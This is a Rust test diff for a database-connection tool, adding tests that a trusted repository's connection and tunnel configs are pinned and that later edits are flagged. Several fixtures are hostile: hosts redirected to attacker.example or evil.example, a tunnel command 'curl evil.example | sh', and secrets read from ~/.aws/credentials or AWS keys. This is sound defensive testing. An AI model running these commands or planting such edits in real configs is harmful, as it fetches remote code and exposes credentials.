@@ -44,9 +44,12 @@ impl Fixture {
         path
     }
 
+    /// Trusts the repository as it is now (ADR-022 pins its content).
     fn trusted(&self) -> TrustStore {
         let mut trust = TrustStore::load(&self.user()).unwrap();
-        trust.trust(&self.repo()).unwrap();
+        trust
+            .trust(&load(Some(&self.repo()), &self.user()))
+            .unwrap();
         trust
     }
 }
@@ -373,13 +376,14 @@ fn with_password(fx: &Fixture, secret: &str) -> spelunk_config::Config {
 #[test]
 fn secrets_resolve_from_each_source() {
     let fx = Fixture::new("secrets");
-    let trust = fx.trusted();
     let backend = FakeBackend {
         env: BTreeMap::from([("PGPASS".into(), "from-env".into())]),
         ..Default::default()
     };
+    // Each secret is a new version of the file: trusted as written.
     let password = |secret: &str| {
         let config = with_password(&fx, secret);
+        let trust = fx.trusted();
         Resolver::new(&config, &trust, &backend)
             .resolve(&ws("db"))
             .map(|r| r.password)
@@ -418,9 +422,9 @@ fn secrets_resolve_from_each_source() {
 #[test]
 fn keychain_asks_the_first_time_and_remembers() {
     let fx = Fixture::new("keychain");
-    let trust = fx.trusted();
     let backend = FakeBackend::default();
     let config = with_password(&fx, "keychain");
+    let trust = fx.trusted();
     let resolver = Resolver::new(&config, &trust, &backend);
 
     let first = resolver.resolve(&ws("db")).unwrap();
@@ -1659,4 +1663,219 @@ fn sqlite_files_on_a_server_go_through_a_tunnel() {
     assert_eq!(resolved.params.database, "data/app.db");
     assert_eq!(resolved.sqlite3.as_deref(), Some("/opt/sqlite/bin/sqlite3"));
     assert_eq!(resolved.tunnel.unwrap().hops[0].host, "files.internal");
+}
+
+const PINNED_DB: &str = "schema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"db.internal\"\ndatabase = \"orders\"\nuser = \"app\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n";
+const PINNED_TUNNEL: &str = "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"ops\"\nauth = [\"agent\"]\n";
+
+fn resolved(fx: &Fixture, trust: &TrustStore) -> Result<(), ResolveError> {
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(config.problems.is_empty(), "{:?}", config.problems);
+    Resolver::new(&config, trust, &FakeBackend::default())
+        .resolve(&ws("orders"))
+        .map(|_| ())
+}
+
+fn changed(result: Result<(), ResolveError>) -> spelunk_config::ItemChange {
+    match result {
+        Err(ResolveError::Changed { change, .. }) => change,
+        other => panic!("expected a change to review: {other:?}"),
+    }
+}
+
+#[test]
+fn a_pull_that_changes_a_trusted_connection_is_asked_about_again() {
+    let fx = Fixture::new("pinned-change");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let mut trust = fx.trusted();
+    resolved(&fx, &trust).unwrap();
+
+    // Comments, formatting and the display name are not changes.
+    std::fs::write(
+        &path,
+        format!(
+            "# reviewed by the team\n{}",
+            PINNED_DB.replace("name = \"Orders\"", "name   =   \"Orders (EU)\"")
+        ),
+    )
+    .unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // The server changes: nothing is resolved, and the change says what and how.
+    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
+    let change = changed(resolved(&fx, &trust));
+    assert_eq!(change.item, "connection:orders");
+    assert!(!change.new);
+    assert_eq!(
+        change.fields,
+        [spelunk_config::FieldChange {
+            field: "host".into(),
+            before: Some("db.internal".into()),
+            after: Some("attacker.example".into()),
+        }]
+    );
+    let message = ResolveError::Changed {
+        root: fx.repo(),
+        change: change.clone(),
+    }
+    .to_string();
+    assert!(
+        message.contains("host db.internal → attacker.example"),
+        "{message}"
+    );
+    // Reloading the trust from disk does not forget the snapshot.
+    let reloaded = TrustStore::load(&fx.user()).unwrap();
+    changed(resolved(&fx, &reloaded));
+
+    // Accepting records only that item.
+    let config = load(Some(&fx.repo()), &fx.user());
+    trust.accept(&config, &change.item).unwrap();
+    resolved(&fx, &trust).unwrap();
+    resolved(&fx, &TrustStore::load(&fx.user()).unwrap()).unwrap();
+}
+
+#[test]
+fn every_way_around_the_snapshot_is_caught() {
+    let fx = Fixture::new("pinned-ways");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    let tunnel = fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let trust = fx.trusted();
+    for (field, edited) in [
+        (
+            "password.secret",
+            PINNED_DB.replace("\"keychain\"", "\"env:AWS_SECRET_ACCESS_KEY\""),
+        ),
+        ("port", format!("{PINNED_DB}port = 15432\n")),
+        ("tunnel", PINNED_DB.replace("tunnel = \"bastion\"\n", "")),
+        (
+            "tls.mode",
+            format!("{PINNED_DB}\n[tls]\nmode = \"disable\"\n"),
+        ),
+        (
+            "user",
+            PINNED_DB.replace("user = \"app\"", "user = \"${env:AWS_SECRET_ACCESS_KEY}\""),
+        ),
+        (
+            "mcp.writes",
+            format!("{PINNED_DB}\n[mcp]\nexposed = true\nwrites = \"allow\"\n"),
+        ),
+    ] {
+        std::fs::write(&path, &edited).unwrap();
+        let change = changed(resolved(&fx, &trust));
+        assert!(
+            change.fields.iter().any(|f| f.field == field),
+            "{field}: {change:?}"
+        );
+    }
+    std::fs::write(&path, PINNED_DB).unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // The tunnel the connection goes through is checked too.
+    std::fs::write(
+        &tunnel,
+        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
+    )
+    .unwrap();
+    let change = changed(resolved(&fx, &trust));
+    assert_eq!(change.item, "tunnel:bastion");
+    assert_eq!(change.fields[0].field, "hops.0.host");
+    std::fs::write(
+        &tunnel,
+        format!("{PINNED_TUNNEL}command = \"curl evil.example | sh\"\n"),
+    )
+    .unwrap();
+    assert_eq!(changed(resolved(&fx, &trust)).item, "tunnel:bastion");
+    std::fs::write(&tunnel, PINNED_TUNNEL).unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // A connection added after trusting is new: nothing of it is resolved either.
+    fx.write(
+        "repo/.spelunk/connections/new.toml",
+        "schema_version = 1\nengine = \"postgres\"\nhost = \"x\"\ndatabase = \"d\"\nuser = \"u\"\npassword = { secret = \"cmd:cat ~/.aws/credentials\" }\n",
+    );
+    let config = load(Some(&fx.repo()), &fx.user());
+    match Resolver::new(&config, &trust, &FakeBackend::default()).resolve(&ws("new")) {
+        Err(ResolveError::Changed { change, .. }) => {
+            assert!(change.new);
+            assert!(change.to_string().contains("is new in the repository"));
+        }
+        other => panic!("{other:?}"),
+    }
+    assert_eq!(trust.changes(&config).len(), 1);
+}
+
+#[test]
+fn drafts_are_the_users_but_the_tunnels_they_use_are_checked() {
+    let fx = Fixture::new("pinned-draft");
+    fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    let tunnel = fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let trust = fx.trusted();
+    let backend = FakeBackend::default();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = ConnectionDraft {
+        host: "typed-by-the-user".into(),
+        ..ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap())
+    };
+    let resolver = Resolver::new(&config, &trust, &backend);
+    resolver.resolve_edit(&ws("orders"), &draft).unwrap();
+    resolver
+        .resolve_draft(&ConnectionDraft {
+            name: "Copy".into(),
+            ..draft.clone()
+        })
+        .unwrap();
+
+    std::fs::write(
+        &tunnel,
+        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
+    )
+    .unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let resolver = Resolver::new(&config, &trust, &backend);
+    assert!(matches!(
+        resolver.resolve_edit(&ws("orders"), &draft),
+        Err(ResolveError::Changed { .. })
+    ));
+}
+
+#[test]
+fn repositories_trusted_before_snapshots_are_adopted_as_they_are() {
+    let fx = Fixture::new("pinned-legacy");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    // A trust file written before ADR-022: trusted by path only.
+    let root = std::fs::canonicalize(fx.repo()).unwrap();
+    std::fs::write(
+        fx.user().join("trusted-workspaces.toml"),
+        toml::to_string(&toml::Table::from_iter([(
+            "trusted".to_string(),
+            toml::Value::Array(vec![root.display().to_string().into()]),
+        )]))
+        .unwrap(),
+    )
+    .unwrap();
+    let mut trust = TrustStore::load(&fx.user()).unwrap();
+    assert!(trust.is_trusted(&fx.repo()));
+    resolved(&fx, &trust).unwrap();
+
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(trust.adopt(&config).unwrap());
+    assert!(!trust.adopt(&config).unwrap());
+    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
+    changed(resolved(&fx, &TrustStore::load(&fx.user()).unwrap()));
+
+    // Trusting again accepts the change, and says which.
+    let config = load(Some(&fx.repo()), &fx.user());
+    let accepted = trust.trust(&config).unwrap();
+    assert_eq!(accepted.len(), 1);
+    assert_eq!(accepted[0].item, "connection:orders");
+    resolved(&fx, &trust).unwrap();
+
+    // Revoking forgets the snapshots: trusting later starts again from what is there.
+    trust.revoke(&fx.repo()).unwrap();
+    assert!(matches!(
+        resolved(&fx, &trust),
+        Err(ResolveError::Untrusted { .. })
+    ));
 }
